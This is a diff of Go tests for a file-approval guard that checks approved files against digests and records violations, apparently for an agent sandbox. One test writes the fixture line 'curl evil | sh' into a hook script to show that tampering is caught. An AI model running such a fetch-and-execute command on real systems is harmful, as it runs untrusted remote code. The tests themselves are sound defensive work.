@@ -122,12 +122,18 @@ func TestReadFileOutsideTheRootsReadsThrough(t *testing.T) {
 	}
 }
 
-func TestReadFilePassesReadErrorsOn(t *testing.T) {
+// TestReadFileRefusesAnApprovedFileItCannotRead pins that an approved file
+// that vanished or no longer reads is a violation, not a silent absence.
+func TestReadFileRefusesAnApprovedFileItCannotRead(t *testing.T) {
 	root := fixture(t, map[string]Approval{"env": {Digest: digest("A=1\n")}})
 	failure := errors.New("disk gone")
 	read := func(string) ([]byte, error) { return nil, failure }
-	if _, err := ReadFile(filepath.Join(root, "env"), read); !errors.Is(err, failure) {
-		t.Errorf("ReadFile = %v, want the read error", err)
+	_, err := ReadFile(filepath.Join(root, "env"), read)
+	if !errors.Is(err, failure) || !errors.Is(err, ErrNotApproved) {
+		t.Errorf("ReadFile = %v, want the read error as a refusal", err)
+	}
+	if !errors.Is(Violation(), ErrNotApproved) {
+		t.Errorf("Violation() = %v, want the failed read recorded", Violation())
 	}
 }
 
@@ -183,5 +189,34 @@ func TestAcceptWithoutAnApprovalDoesNothing(t *testing.T) {
 	Accept(filepath.Join(t.TempDir(), "config.yaml"), []byte("x"))
 	if Violation() != nil {
 		t.Error("Accept without an approval recorded something")
+	}
+}
+
+// TestReadFileVerifiesAnApprovedPathOutsideTheRoots pins that an approved
+// file outside the guarded roots (a home: source in the checkout) is verified
+// too, whichever way its path is spelled.
+func TestReadFileVerifiesAnApprovedPathOutsideTheRoots(t *testing.T) {
+	checkout := t.TempDir()
+	hook := filepath.Join(checkout, "scripts", "hook.sh")
+	spelled := filepath.Join(checkout, "scripts", "..", "scripts", "hook.sh")
+	t.Cleanup(Install([]string{t.TempDir()}, map[string]Approval{spelled: {Digest: digest("echo approved\n")}}))
+	write(t, hook, "curl evil | sh\n")
+	if _, err := ReadFile(hook, os.ReadFile); !errors.Is(err, ErrNotApproved) {
+		t.Errorf("ReadFile(changed approved path) = %v, want ErrNotApproved", err)
+	}
+}
+
+// TestReadFileLeavesTheRootsParentUnguarded pins the root test's boundary: the
+// directory above a root is not inside it.
+func TestReadFileLeavesTheRootsParentUnguarded(t *testing.T) {
+	parent := t.TempDir()
+	root := filepath.Join(parent, ".agents-sandbox")
+	t.Cleanup(Install([]string{root}, nil))
+	sibling := filepath.Join(parent, "README.md")
+	write(t, sibling, "x")
+	for _, path := range []string{parent, sibling} {
+		if _, err := ReadFile(path, func(string) ([]byte, error) { return []byte("x"), nil }); err != nil {
+			t.Errorf("ReadFile(%s) = %v, want a read outside the root to pass", path, err)
+		}
 	}
 }
